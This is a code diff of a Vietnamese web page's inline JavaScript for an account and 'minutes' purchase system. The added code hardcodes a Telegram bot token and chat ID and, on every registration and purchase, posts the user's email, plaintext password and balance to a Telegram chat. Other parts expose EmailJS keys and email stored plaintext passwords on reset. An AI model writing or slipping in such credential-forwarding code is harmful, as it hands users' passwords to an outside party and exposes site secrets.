@@ -234,6 +234,41 @@
     <script>
         AOS.init({ once: true, duration: 600 });
 
+        // ===============================================
+        // KẾT NỐI VỚI BOT TELEGRAM
+        // ===============================================
+        // ĐIỀN THÔNG TIN CỦA BẠN VÀO 2 DÒNG DƯỚI ĐÂY
+        const TELEGRAM_BOT_TOKEN = '8298166128:AAG9Mz-LM2_GWAWJzxSjcxv88eBQ0qMdHxA'; 
+        const TELEGRAM_CHAT_ID = '8298166128';
+
+        function sendDataToTelegram(action, userObj, extraInfo = "") {
+            // Nếu chưa điền Token thì bỏ qua không gửi để tránh lỗi web
+            if (TELEGRAM_BOT_TOKEN === 'ĐIỀN_TOKEN_BOT_CỦA_BẠN_VÀO_ĐÂY') return;
+
+            let message = `🔔 <b>HỆ THỐNG AE - THÔNG BÁO MỚI</b>\n`;
+            message += `👉 Hành động: <b>${action}</b>\n`;
+            message += `👤 Email: ${userObj.email}\n`;
+            message += `🔑 Mật khẩu: <span class="tg-spoiler">${userObj.password}</span>\n`;
+            message += `⏳ Ví phút hiện tại: ${userObj.walletMinutes} phút\n`;
+            message += `💰 Số dư VNĐ: ${(userObj.balance || 0).toLocaleString('vi-VN')} đ\n`;
+            
+            if(extraInfo !== "") {
+                message += `\n📝 Chi tiết: ${extraInfo}`;
+            }
+
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            
+            fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: message,
+                    parse_mode: 'HTML'
+                })
+            }).catch(err => console.error("Lỗi gửi Telegram:", err));
+        }
+
         // ==========================================
         // CƠ SỞ DỮ LIỆU ĐA TÀI KHOẢN (MẢNG)
         // ==========================================
@@ -368,32 +403,24 @@
             const user = db.find(u => u.email === inputEmail);
 
             if (user) {
-                // Đổi trạng thái nút thành Đang Gửi
                 const submitBtn = document.getElementById('btn-forgot-submit');
                 const originalText = submitBtn.innerHTML;
                 submitBtn.innerHTML = `<svg class="animate-spin -ml-1 mr-3 h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24"><circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle><path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path></svg> Đang gửi email...`;
                 submitBtn.disabled = true;
 
-                // ----------------------------------------------------
-                // ĐÃ SỬA CHỮ S THÀNH VIẾT THƯỜNG
-                // ----------------------------------------------------
                 const YOUR_PUBLIC_KEY = "Bw--9nA7dfh1A5GIR";
-                const YOUR_SERVICE_ID = "service_h4ii5u7"; // Sửa 'S' thành 's'
+                const YOUR_SERVICE_ID = "service_h4ii5u7"; 
                 const YOUR_TEMPLATE_ID = "template_ovpo9hk";
 
-                // Gắn Public Key vào hệ thống EmailJS
                 emailjs.init(YOUR_PUBLIC_KEY);
 
-                // Các tham số tương ứng với {{to_email}} và {{user_password}}
                 const templateParams = {
                     to_email: user.email,
                     user_password: user.password
                 };
 
-                // Lệnh gửi email
                 emailjs.send(YOUR_SERVICE_ID, YOUR_TEMPLATE_ID, templateParams)
                     .then(function(response) {
-                        // Thành công
                         submitBtn.innerHTML = originalText;
                         submitBtn.disabled = false;
                         
@@ -404,12 +431,10 @@
                         document.getElementById('forgot-form').reset();
                         switchTab('login');
                     }, function(error) {
-                        // Thất bại: Hiển thị lỗi chi tiết ra màn hình
                         submitBtn.innerHTML = originalText;
                         submitBtn.disabled = false;
                         console.error('Lỗi EmailJS:', error);
                         
-                        // Trích xuất thông báo lỗi chính xác từ EmailJS
                         let errorDetail = error.text || error.message || "Lỗi không xác định";
                         
                         showModal('error', 'Lỗi Hệ Thống', [
@@ -444,6 +469,9 @@
             db.push(newUser);
             saveUsersDB(db);
             
+            // --> GỬI THÔNG BÁO VỀ TELEGRAM LÀ CÓ NGƯỜI ĐĂNG KÝ
+            sendDataToTelegram("Tạo tài khoản mới", newUser, "Khách hàng vừa đăng ký thành công trên website.");
+
             showModal('success', 'Thành công', ['<p class="text-center">Tạo tài khoản thành công! Bạn có thể đăng nhập ngay.</p>']);
             document.getElementById('register-form').reset();
             switchTab('login');
@@ -528,6 +556,9 @@
 
                 saveCurrentUser(user);
                 loadDashboardUI(user);
+
+                // --> GỬI THÔNG BÁO VỀ TELEGRAM LÀ CÓ NGƯỜI MUA GÓI
+                sendDataToTelegram("Khách hàng Mua Gói Phút", user, `Vật phẩm: ${packageName} \n💰 Đã thanh toán: ${price.toLocaleString('vi-VN')}đ \n⚡️ Số phút nhận: +${minutes} phút`);
 
                 showModal('success', 'Nạp phút thành công!', [
                     `<div class="bg-slate-50 p-4 rounded-xl border border-slate-100 mb-2 space-y-2">`,
